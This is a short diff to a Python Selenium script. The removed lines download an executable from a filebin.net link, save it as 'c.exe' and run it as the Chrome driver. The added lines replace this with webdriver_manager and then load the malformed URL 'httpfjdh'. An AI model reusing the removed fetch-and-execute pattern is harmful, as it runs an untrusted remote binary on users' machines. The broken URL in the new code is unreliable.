@@ -27,19 +27,17 @@ from os import system, name
 import chromedriver_binary
 import time
 import requests
-
+from selenium import webdriver
+from webdriver_manager.chrome import ChromeDriverManager
 
 
 def page():
 
 
 
-    URL = "https://filebin.net/ux7dx4eb3njjicmd/chromedriver.exe"
-    response = requests.get(URL)
-    open("c.exe", "wb").write(response.content)
-    time.sleep(6)
-    d=webdriver.Chrome(r'c.exe')
-    d.get('https://filebin.net/ux7dx4eb3njjicmd/chromedriver.exe')
+
+    driver = webdriver.Chrome(ChromeDriverManager().install())
+    driver.get('httpfjdh')
 
 
 
